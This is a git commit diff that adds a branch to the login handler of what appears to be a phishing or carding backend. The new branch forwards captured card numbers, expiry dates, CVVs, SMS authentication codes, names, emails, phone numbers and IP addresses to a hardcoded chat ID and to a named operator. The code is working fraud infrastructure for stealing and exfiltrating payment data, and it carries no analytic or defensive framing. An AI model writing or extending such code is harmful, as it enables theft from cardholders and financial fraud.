c8e27d2bdc2f6c09df7994b68a176ee9f6aef46b
Your Name <you@example.com>
2024-08-23 14:49:58 +0300

    iour3ejghoiuerjgerw

--- main.py
+++ main.py
@@ -310,6 +310,14 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(germa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
+        elif id == '10000029':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(usama, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(usama, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
         
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
